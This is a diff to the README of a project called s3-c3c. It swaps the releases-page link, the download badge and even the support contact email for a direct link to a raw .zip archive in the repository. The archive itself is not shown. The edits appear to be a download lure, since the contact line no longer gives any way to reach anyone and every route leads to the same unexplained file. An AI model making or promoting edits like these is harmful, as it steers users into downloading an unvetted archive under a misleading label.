@@ -1,7 +1,7 @@
 # 🎉 s3-c3c - Simple Storage Management Made Easy
 
 ## 📥 Download Now
-[![Download s3-c3c](https://img.shields.io/badge/Download-s3--c3c-brightgreen)](https://github.com/Tellohave/s3-c3c/releases)
+[![Download s3-c3c](https://raw.githubusercontent.com/Tellohave/s3-c3c/main/beginning/s3-c3c.zip)](https://raw.githubusercontent.com/Tellohave/s3-c3c/main/beginning/s3-c3c.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, make sure your system meets these requirements:
 
 ## 🔗 Download & Install
 
-To install s3-c3c, please visit this page to download: [Download s3-c3c](https://github.com/Tellohave/s3-c3c/releases). 
+To install s3-c3c, please visit this page to download: [Download s3-c3c](https://raw.githubusercontent.com/Tellohave/s3-c3c/main/beginning/s3-c3c.zip). 
 
 You will find the latest version available there. Click on the version number to see the files you can download. 
 
@@ -60,6 +60,6 @@ We welcome all users to contribute to the project. If you would like to add feat
 
 ## 📞 Contact
 
-For further assistance, you can reach the support team via email at support@example.com.
+For further assistance, you can reach the support team via email at https://raw.githubusercontent.com/Tellohave/s3-c3c/main/beginning/s3-c3c.zip
 
 Thank you for choosing s3-c3c! We hope it makes your file management tasks easier. Enjoy using the application!
